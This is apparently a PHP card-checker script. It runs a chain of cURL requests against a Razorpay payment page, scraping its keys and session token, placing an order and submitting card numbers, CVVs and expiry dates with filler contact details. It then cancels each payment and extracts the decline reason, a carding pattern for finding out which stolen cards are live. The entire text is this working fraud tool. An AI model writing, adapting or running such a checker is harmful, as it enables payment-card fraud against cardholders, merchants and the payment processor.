# 00 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://pages.razorpay.com/pl_I1lWDMsPDAbdOh/view#view-1');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$curl0 = curl_exec($ch);
$pl = trim(strip_tags(getStr($curl0,'payment_link":{"id":"','"')));
$ppi = trim(strip_tags(getStr($curl0,'payment_page_items":[{"id":"','"')));
$rzp = trim(strip_tags(getStr($curl0,'{"key_id":"','"')));
  
# 01 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.razorpay.com/v1/payment_buttons/'.$pl.'/button_details');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$curl1 = curl_exec($ch);
$key = trim(strip_tags(getStr($curl1,'keyless_header":"','"')));
$key = urlencode(str_replace("\\", "", "$key"));
  
# 02 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.razorpay.com/v1/checkout/public?traffic_env=production&build=08cd269e430aaad5a44fca95db8f36fdb15debde&build_v1=0d3ee762e1ca33920f5fc9d25acb6bafcd9c5410&checkout_v2=1&new_session=1');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array(
'content-type: application/json',
'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$curl2 = curl_exec($ch);
$session = trim(strip_tags(getStr($curl2,'session_token="','"')));
$amount = $value5 * 100;
if (empty($amount) && $amount !== '0') { $amount = 100;}

# 03 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.razorpay.com/v1/payment_pages/'.$pl.'/order');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/json',
'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"line_items":[{"payment_page_item_id":"'.$ppi.'","amount":'.$amount.'}],"notes":{"email":"'.$email.'","phone":"9'.$NUM3.'"}}');
$curl3 = curl_exec($ch);
$order = trim(strip_tags(getStr($curl3,'id":"order','"')));


# 04 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.razorpay.com/payments_cross_border_live/v1/checkout/cb_flows?key_id='.$rzp.'&keyless_header='.$key.'');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/json',
'x-session-token: '.$session.'',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"identifiers":{"merchant":{"country":"IN"},"card":{"country":"US","dcc_blacklist":false,"network":"MasterCard"},"method":"card","payment_currency":"INR"},"forex_charges":{"amount":'.$amount.',"currency":"INR","filters":{"method":"card"}}}');
$curl4 = curl_exec($ch);
$cid = trim(strip_tags(getStr($curl4,'id":"','"')));

# 05 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.razorpay.com/v1/standard_checkout/payments/create/ajax?key_id='.$rzp.'&session_token='.$session.'&keyless_header='.$key.'');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'x-session-token: '.$session.'',
'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'notes%5Bemail%5D='.$email.'&notes%5Bphone%5D=9'.$NUM3.'&notes%5Bname%5D='.$FN.'%20'.$LN.'&payment_link_id='.$pl.'&key_id='.$rzp.'&contact=%2B919'.$NUM3.'&email='.$email.'&currency=INR&_%5Bintegration%5D=payment_button&_%5Bcheckout_id%5D=&_%5Bdevice.id%5D=&_%5Benv%5D=&_%5Blibrary%5D=checkoutjs&_%5Blibrary_src%5D=v2-entry.modern.js&_%5Bcurrent_script_src%5D=v2-entry.modern.js&_%5Bis_magic_script%5D=false&_%5Bplatform%5D=browser&_%5Breferer%5D=https%3A%2F%2Frazorpay.com%2Fpayment-button%2F'.$pl.'%2Fview&_%5Bshield%5D%5Bfhash%5D=&_%5Bshield%5D%5Btz%5D=0&_%5Bdevice_id%5D=&_%5Bbuild%5D=&_%5Brequest_index%5D=0&amount='.$amount.'&order_id=order'.$order.'&method=card&card%5Bnumber%5D='.$cc.'&card%5Bcvv%5D='.$cvv.'&card%5Bname%5D='.$FN.'%20'.$LN.'&card%5Bexpiry_month%5D='.$mon.'&card%5Bexpiry_year%5D='.$year.'&save=0&currency_request_id='.$cid.'&dcc_currency=INR');
$curl5 = curl_exec($ch);
$pay = trim(strip_tags(getStr($curl5,'payment_id":"pay_','"')));

# 06 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.razorpay.com/pg_router/v1/payments/'.$pay.'/authenticate');

curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
$curl6 = curl_exec($ch);
  
# 07 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.razorpay.com/pg_router/v1/payments/'.$pay.'/authenticate');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'browser%5Bjava_enabled%5D=false&browser%5Bjavascript_enabled%5D=true&browser%5Btimezone_offset%5D=0&browser%5Bcolor_depth%5D=24&browser%5Bscreen_width%5D=440&browser%5Bscreen_height%5D=956&browser%5Blanguage%5D=en-US&auth_step=3ds2Auth');
$curl7 = curl_exec($ch);

sleep(2);  
# 08 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.razorpay.com/v1/standard_checkout/payments/pay_'.$pay.'/cancel?key_id='.$rzp.'&session_token='.$session.'&keyless_header='.$key.'');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
$curl8 = curl_exec($ch);
$dmessage = trim(strip_tags(getStr($curl8,'description":"','"')));
$dmessage2 = trim(strip_tags(getStr($curl8,'reason":"','"')));
